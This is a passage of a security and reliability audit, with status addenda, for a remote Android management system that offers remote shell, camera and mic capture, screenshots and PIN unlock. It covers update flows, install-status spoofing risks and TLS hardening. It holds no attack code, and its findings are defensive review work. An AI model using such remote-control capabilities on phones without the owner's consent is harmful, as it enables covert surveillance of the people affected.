   `type=file_chunk`, so they are discarded. The text handler has no
   `file_start`/`file_end` branches either. `FileTransfer.sendFile` returns only
   path, byte/chunk counts and SHA-256, not contents. Consequently successful
   command status cannot produce a downloaded file. Add a receive sink and
   operator delivery path, bind it to device/command, and verify bytes/hash.
   An isolated invocation of the actual binary handler with a synthetic chunk
   confirmed it created no receiver state and called no cache sink.

2. **P1 — CLI `files put` does not upload** (`server/ghostctl.py:215-219`).
   `build_args` treats every files command as pass-through. A request such as
   `files put /sdcard/test.txt /tmp/source.txt` becomes a plain `op=command`
   RPC, whose device handler waits for chunks that nobody sends. There is no
   CLI source-file reader or admin upload operation invoking `push_file` for
   this path. The same request occurs in e2e. Implement the upload path with
   clear source/destination semantics, then verify a complete round trip.
   Reproduced the exact emitted request with a mocked RPC, without contacting
   the daemon or reading source contents.

3. **P1 — shell can deadlock on stderr**
   (`client-main/app/src/main/java/com/tg/ghostd/CommandHandler.kt:618-619`).
   stdout is read to EOF before stderr is drained. A command that writes more
   than the stderr pipe capacity blocks writing; stdout never reaches EOF
   while that child is alive. The worker and child remain after the server
   command timeout. Drain both concurrently or merge them if separate output
   is unnecessary; add a bounded process lifetime and output size. Static
   finding; not executed on Android.

4. **P2 — explicit operation failures get a successful wire envelope**
   (`client-main/app/src/main/java/com/tg/ghostd/CommandHandler.kt:137-139`).
   `sidekickSend` converts link exceptions into `{ok:false,error:...}`, and
   the sidekick router also returns explicit failures. `execute` wraps all
   these returns with `ok=true,status=ok`; daemon result handling trusts that
   outer value. A failed tap/type can therefore exit CLI zero and enter
   history as successful. Propagate explicit operation errors while retaining
   their diagnostic payload. Static cross-component finding.

5. **P2 — CLI device names/prefixes do not work for commands or update**
   (`server/ghostctl.py:211,218`). `resolve_device` is called only for rename.
   Both command and OTA RPCs send `ns.device` literally, but daemon approval
   and connection maps require exact IDs. `-d "Pixel 10a" status` is rejected
   instead of targeting the named device. Resolve once before device-targeted
   operations. Mocked CLI execution confirmed the literal name in the RPC.

6. **P2 — e2e cannot run from this checkout** (`server/e2e_test.py:16,23`).
   Every subprocess uses the original VPS's absolute directory as `cwd`.
   That directory is absent here, so the first check raises FileNotFoundError
   before invoking the CLI. Derive BASE from the script location. Filesystem
   check confirmed the configured directory is absent; no device run attempted.

7. **P2 — obsolete timeout cleanup can remove a new upload's temporary file**
   (`client-main/app/src/main/java/com/tg/ghostd/FileReceiver.kt:260-265`).
   `await` evaluates idle/overall timeout outside `lock`. After its timed latch
   wait returns false, `onEnd` or `abortAll` can complete that transfer and
   `prepare` can open a new transfer to the same destination. The old worker
   can then call `fail(old)` and unconditionally delete `<dest>.part` belonging
   to the replacement. The pending-identity guard runs only after deletion.
   An interrupted old waiter has the same unsafe cleanup path. Guard terminal
   state and identity before touching the shared path; make cleanup idempotent
   or give transfers unique temp files. Static interleaving proof; not
   reproduced on device or in JVM tests.

# Unattended updates and availability review — 2026-10-25

Scope: current local `AppUpdater`, `SidekickInstaller`, manifest/build settings,
service/boot lifecycle, and daemon/CLI OTA routing. Product files were already
being changed elsewhere during review; this review only edits the two audit
documents. U1–U8 below remain present in the inspected source.

## What is now present, and what is not proven

- The main manifest now declares `UPDATE_PACKAGES_WITHOUT_USER_ACTION`.
  Both apps target API 36, and eligible updater calls request
  `USER_ACTION_NOT_REQUIRED` on API 31+. This corrects the previous missing
  permission at source level; it does not establish the installed APK's state.
- Android requires the relevant install authorization and target SDK, plus
  self-update or the appropriate installer/update ownership. Same signing
  identity is necessary for compatible replacement but does not alone remove
  confirmation. The installer must still handle pending user action.
  [Platform conditions](https://developer.android.com/reference/android/content/pm/PackageInstaller.SessionParams#setRequireUserAction(int)).
- A new permission takes effect after that version is installed; the old
  installer cannot use the incoming manifest to make its own transition
  unattended. An initial owner-confirmed transition may be necessary.
- The source provides operator-triggered single-device OTA and a bundled
  sidekick version check at service/setup start. It has no verified fleet
  release scheduler, durable rollout reconciliation, or working `--all update`.
  The current CLI explicitly rejects that option rather than pretending to
  broadcast it. No new fleet feature was implemented in this review.

## U1 — P1: self-update loses its completion observer

**Locations:** `AppUpdater.kt:217-245,250-308`; `BootReceiver.kt:9-20`;
`server/daemon.py:dispatch`, `_disconnect_device`, `device_handler` hello branch.

The status receiver and blocking queue exist only in the process that creates
the session. A full self-update kills that process before installation completes;
there is no manifest receiver for `UPDATE_STATUS` or persisted update/session
record. `MY_PACKAGE_REPLACED` restarts the service but does not resume completion
tracking. The daemon fails pending commands on disconnect, and a hello with a
new `app_version` only updates device metadata. Thus an installed update can be
reported as a failure (or timeout if the old connection was superseded first).
The updater comment promising a success response before replacement is incorrect.

**Evidence:** isolated execution of the actual current `dispatch` and
`_disconnect_device` methods, with mocked persistence/transport, returned
`status=error, result={error:"device disconnected"}` even after simulated
reconnect/new-version state. This is server control-flow proof, not an actual
Android installation. Android documents that installs normally kill the running
process before completion; its split-install exception does not describe this
`MODE_FULL_INSTALL` flow.
[Process replacement](https://developer.android.com/reference/android/content/pm/PackageInstaller.SessionParams#setDontKillApp(boolean)).

**Required behavior/check:** persist an update identifier, expected package and
versionCode; retain an installing/reconnecting state and verify the installed
version after restart. A successful self-update must finish successfully even
without a final result from the replaced process; an unchanged version must
not count as success. Test an actual approved-device self-update.

## U2 — P1: concurrent installs consume each other's status

**Locations:** `AppUpdater.kt:223-235,263-277`;
`SidekickInstaller.kt:128-138`; `GhostService.kt:65-71`.

Every `installApk` call registers a receiver for the same `ACTION_STATUS` and
enqueues every matching broadcast. There is no `EXTRA_SESSION_ID` check or
per-session action/URI. Different PendingIntent request codes distinguish the
PendingIntents but do not scope receivers listening for the same action.
Background bundled provisioning can overlap a command install even when daemon
commands are serialized. Session A's success can make B report installed before
B finishes; A's failure can incorrectly fail B.

**Required behavior/check:** match callbacks to the owning session and package,
and coordinate competing installations. Test two concurrent sessions with
different results; neither waiter may consume the other's terminal event.
Static finding; Android callback delivery was not exercised.

## U3 — P1: exported install-status receiver trusts external messages

**Locations:** `AppUpdater.kt:225-234,263-286`.

The custom status receiver is exported and registered without a sender
permission. It trusts status extras and can launch the supplied confirmation
Intent. Another installed app can send a matching unprotected broadcast during
an update, causing a false success/failure or an unintended activity launch.
The outgoing callback's `setPackage` restricts its destination; it does not
authenticate all incoming messages to this exported receiver.

**Required behavior/check:** use a callback receiver/delivery arrangement
protected from unrelated senders and validate session identity before consuming
status or launching UI. Test both genuine PackageInstaller callbacks and an
unrelated sender; the latter must have no effect. No spoofing was attempted.
[Android broadcast protection](https://developer.android.com/develop/background-work/background-tasks/broadcasts).

## U4 — P2: early failures bypass installer cleanup

**Locations:** `AppUpdater.kt:217-248,250-311`.

The receiver is registered before copying the APK. If `openWrite`, file reading
or `commit` throws, only `session.close()` runs; execution never reaches the
later try/finally that unregisters the receiver. Session creation/open/register
failures also lack a common cleanup owner. There is no abandonment path, so a
partially staged, uncommitted session can retain disk space. A timeout waiting
for user action unregisters the receiver but leaves the session unresolved;
later confirmation can install after the command has reported failure.

**Required behavior/check:** cover the complete lifecycle with cleanup, abandon
failed uncommitted sessions, and explicitly define cancellation/reconciliation
for committed sessions. Inject a staging failure and check receiver/session
counts and disk usage; test timeout followed by a late result. `close()` only
releases the session object; it does not destroy staged state.
[Session lifecycle](https://developer.android.com/reference/android/content/pm/PackageInstaller.Session).

## U5 — P2: requested package and APK package are never compared

**Locations:** `AppUpdater.kt:103-112,131-147,202-215,237`;
`server/ghostctl.py:apks_cmd`, `stage_update_apk`.

The source reads the archive versionName but never verifies its package name
against the requested target. `sessionName="ghostd"` is an entry name for
`openWrite`, not a package constraint. If a valid ghosta APK is mistakenly
staged as ghostd.apk, `update self` can update ghosta and report target=self
while ghostd's version is unchanged. Android still enforces signature checks
for whichever package the APK actually contains; this finding is about wrong
target selection, not bypassing signature verification.

**Required behavior/check:** reject unreadable or mismatched package identity
before committing; constrain the session to the expected package and check
installed versionCode afterward. Test swapped ghosta/ghostd artifacts. Static
finding; no wrong-package installation was attempted.

## U6 — P2: bundled updates use display version as update ordering

**Locations:** `SidekickInstaller.kt:93-105`; `VersionInfo.kt:12-30`;
`AppUpdater.kt:73-84`.

Bundled provisioning compares only numeric components of versionName. An APK
with a greater versionCode but the same display name is marked up-to-date and
never installed. Conversely, a greater display name with an older code is
repeatedly attempted and rejected as a downgrade. Non-numeric labels are also
collapsed to zero. versionName is display metadata; versionCode is the ordering
field for Android package versions.

**Required behavior/check:** compare installed and archive longVersionCode,
using versionName for display. Cover higher-code/same-name and lower-code/
higher-name cases. Static finding.
[Android versioning](https://developer.android.com/studio/publish/versioning).

## U7 — P1: indefinite dataSync FGS conflicts with Android 15+ timeout

**Locations:** `GhostService.kt:46-61,75-88`; `client-main/app/build.gradle.kts:19`.

The API-36 app starts a dataSync foreground service for its persistent socket,
returns START_STICKY and has no `onTimeout(int,int)` handler. Under standard
Android 15+ rules, this type has six background hours per 24-hour period. When
the budget expires, failure to stop promptly causes a fatal exception; restarting
the same service does not reset the budget. A phone left unattended can therefore
lose the connection needed to receive an update.

**Required behavior/check:** handle timeout and design the remote-management
lifecycle around supported scheduling/management facilities appropriate to its
actual work. Verify background budget exhaustion and recovery on an applicable
device; do not claim that a service restart or unrelated service-type label
solves the platform restriction. Platform/code finding, not an observed Pixel
timeout. [FGS timeouts](https://developer.android.com/develop/background-work/services/fgs/timeout).

## U8 — P1: direct boot restart uses a prohibited FGS type

**Locations:** `BootReceiver.kt:13-20`; `GhostService.kt:54-58`;
`client-main/app/build.gradle.kts:19`.

The receiver starts GhostService from BOOT_COMPLETED, which immediately starts
foreground as dataSync. Android 15+ prohibits that boot-launched type for apps
targeting API 35+, including this API-36 build. The existing backlog's request
to catch boot exceptions alone is insufficient: swallowing the error still
leaves this recovery path unable to connect. This finding concerns reboot;
it does not assert that MY_PACKAGE_REPLACED has the same boot restriction.

**Required behavior/check:** implement and verify a supported post-boot
recovery path. Reboot an enrolled Android 15+ device and confirm expected
connectivity without relying on the disallowed boot launch. Other sidekick
recovery paths must be tested separately. Static code + platform evidence.
[Boot restrictions](https://developer.android.com/about/versions/15/behavior-changes-15#fgs-boot-completed).

## Verification boundary

No APK was built, deployed or installed; no phone command or permission-setting
change was made. Current CLI alias resolution and rejection of `--all update`
were checked with mocked RPC. The source manifest was XML-parsed successfully.
The daemon disconnect case used extracted actual methods with mocked external
effects. Android lifecycle/security cases need targeted device/emulator tests.
Existing local edits and test files from other work were preserved. This audit
cannot certify a fully unattended fleet rollout from source inspection alone.

---

# Implementation status addendum — 2026-10-25

This addendum records current source status; the audit evidence above is kept
unchanged. **Source fixes and unit tests are not device/deployment proof.**

- Additional focused review findings 1–7 are addressed in source: downloads
  carry verified bytes, CLI uploads stream through the daemon, shell pipes are
  bounded/drained concurrently, explicit failures propagate, aliases resolve,
  E2E paths are portable, and obsolete upload cleanup is identity-checked.
- U1–U8 are addressed in source: self-update completion reconciles a strictly
  greater `version_code` after reconnect; install callbacks are session/package
  scoped with cleanup and package validation; bundled upgrades compare version
  codes; and the persistent service uses an explicitly declared owner-authorized
  `specialUse` foreground type rather than time-limited `dataSync`.
- The server/console/CLI findings have implementations and regression tests for
  enrollment, connection ownership, pending cleanup, bounded history,
  authenticated/redacted admin operations, stream TTL/caps, broadcast results,
  CSRF/XSS/request limits, responsive console workflows, and file/device removal.
- Local verification at this addendum: **254 server tests, 154 ghostd tests and
  115 ghosta tests pass; both release builds pass.** Kali runs the previous
  HTTPS build (the TLS hardening below still needs redeployment), and the
  emulator reports 29/29 plus unlock, consent, reboot and removal passes. The
  console serves native HTTPS; its current IP certificate is self-signed.

Verified on the emulator: files, UI, shell, camera/mic, screenshots/live
screen, stored-PIN unlock, per-capture consent, reboot recovery and two-app
removal. PackageInstaller proof is mixed: ghosta installed after a timeout;
ghostd self-update failed verification and was not installed. Fleet OTA stays
open; do not bypass Play Protect.

Console HTTPS is implemented with TLS 1.2+ and deployed using a self-signed IP
certificate. External TLS and an authenticated CSRF-protected POST passed, and
plain HTTP on :9443 is rejected; replace the certificate with a CA-issued one
before relying on browser trust. The newer backend hardening is source-tested
but not redeployed: worker-thread handshakes with a 10-second timeout and
32-handshake cap (an idle TCP client cannot block accepts), startup validation
before password generation/binding, a mode-600 private-key requirement,
scheme-correct CSRF origins with `Origin: null` rejected, and HSTS plus a
`Secure` CSRF cookie when native HTTPS is active. Tests include a real OpenSSL
handshake, an idle-connection isolation check, plain-HTTP rejection on the TLS
port, unsafe-key rejection, startup failure without a traceback, and HTTPS
cookie/HSTS headers. Open at that date: redeploying the hardened backend and
re-verifying externally, device-transport WSS/TLS and credential rotation,
production file/directory permissions, approved-device pagination/cap
hardening, the older camera/mic resource audit, endpoint cache/reconnect and
localhost peer-authentication hardening, long-idle availability, and a real
phone-sized console review (including the known UI polling/cancel/download gaps
in `BACKLOG.md`). SMS send, contacts, call-log readers and WhatsApp export remain
unimplemented.

# Security/transport addendum — 2026-10-26

The WSS and credential work landed in commit `1454236` and is deployed on Kali;
the top reconciliation is current. Device transport is WSS-only for
non-loopback binds, ghostd pins the self-signed listener SPKI with a public-CA
fallback, server tokens are hash-only, Android encrypts its token with Keystore
and disables backup, and `rotate-token`/`rotate-admin` implement online
rotation. Local verification is 272 server, 162 ghostd and 115 ghosta tests plus
`py_compile`; release builds pass.

The emulator reconnects over WSS as ghostd 0.4.2 / ghosta 0.2.1. The recorded
29/29 E2E and unlock/consent/reboot/removal checks remain pre-WSS (ghostd 0.4.1).
The full WSS E2E and live token/admin rotation have not been rerun. Pixel 10a
was not touched and remains on ghostd 0.3.8. The console still uses a
self-signed IP certificate and the hardened backend still needs redeployment.
The shared enrollment key remains a residual risk, and the still-open list in
the top reconciliation is authoritative.
